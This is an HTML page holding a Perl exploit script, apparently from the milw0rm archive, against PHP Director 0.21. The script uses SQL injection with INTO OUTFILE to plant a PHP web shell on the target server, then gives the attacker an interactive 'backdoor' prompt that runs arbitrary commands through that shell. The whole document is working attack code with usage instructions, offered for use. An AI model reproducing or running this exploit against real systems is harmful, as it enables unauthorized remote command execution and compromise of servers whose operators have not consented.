<html><head><title>PHP Director <= 0.21 Remote Command Execution Exploit</title></head><pre>--+++===================================================================+++--
--+++====== PHP Director &lt;= 0.21 Remote Command Execution Exploit ======+++--
--+++===================================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub clear
{
	my $out = $_ [0];
	$out =~ s/.+?xx//;
	$out =~ s/xx.+//;
	return $out;
}

sub usage
{
	print   &quot;\nPHP Director &lt;= 0.21 Remote Command Execution Exploit&quot;.
		&quot;\n[+] Author: darkjoker&quot;.
		&quot;\n[+] Site  : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Download: http://downloads.sourceforge.net/phpdirector/PHPDirector-Install-0.21-.zip?modtime=1181090906&amp;big_mirror=0&quot;.
		&quot;\n[+] Usage   : perl ${0} &lt;hostname&gt; &lt;cms path&gt; &lt;shell destination&gt;&quot;.
		&quot;\n[+] Ex.     : perl ${0} localhost /PHPDirector /opt/lampp/htdocs/PHPDirector&quot;.
		&quot;\n[+] Notes   : &lt;shell destination&gt; must be the same directory where CMS is hosted&quot;.
		&quot;\n\n&quot;;
	exit ();
}

sub send_shell
{
	my ($host, $path, $disc_path) = @_;
	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $host,
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	) or die &quot;[-] Exploit failed.\n&quot;;
	my $sql_code = &quot;searching=x' UNION SELECT 1,'xx&lt;? system (\$_GET [cmd]); &quot;.
		    &quot;?&gt;xx', 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 INTO &quot;.
		    &quot;OUTFILE '${disc_path}/shell.php' FROM pp_files#&quot;;
	my $post = &quot;POST ${path}/index.php HTTP/1.1\r\n&quot;.
		&quot;Host: ${host}\r\n&quot;.
		&quot;Connection: Close\r\n&quot;.
		&quot;Content-Length: &quot;. length ($sql_code) . &quot;\r\n&quot;.
		&quot;Content-Type: application/x-www-form-urlencoded\r\n\r\n&quot;.
		$sql_code;
	print $sock $post;
	close ($sock);
}

my ($host, $path, $disc_path) = @ARGV;
usage unless ($disc_path);
$disc_path = &quot;../&quot;x10 . $disc_path;
send_shell ($host, $path, $disc_path);
print &quot;Delete this shell after use.\n'quit' command to exit\n\n&quot;;
my $cmd;
while (1)
{
	print &quot;backdoor\@${host}: \$ &quot;;
	$cmd = &lt;STDIN&gt;;
	chomp $cmd;
	$cmd =~ s/ /%20/g;
	exit if ($cmd =~ /quit/);
	my $sock = new IO::Socket::INET (
		PeerHost =&gt; $host,
		PeerPort =&gt; 80,
		Proto    =&gt; &quot;tcp&quot;,
	);
	my $get = &quot;GET ${path}/shell.php?cmd=${cmd}\r\n\r\n&quot;;
	print $sock $get;
	my $x;
	$x .= $_ while (&lt;$sock&gt;);
	$x = clear ($x);
	print $x;
	close ($sock);
}

# milw0rm.com [2009-02-09]</pre></html>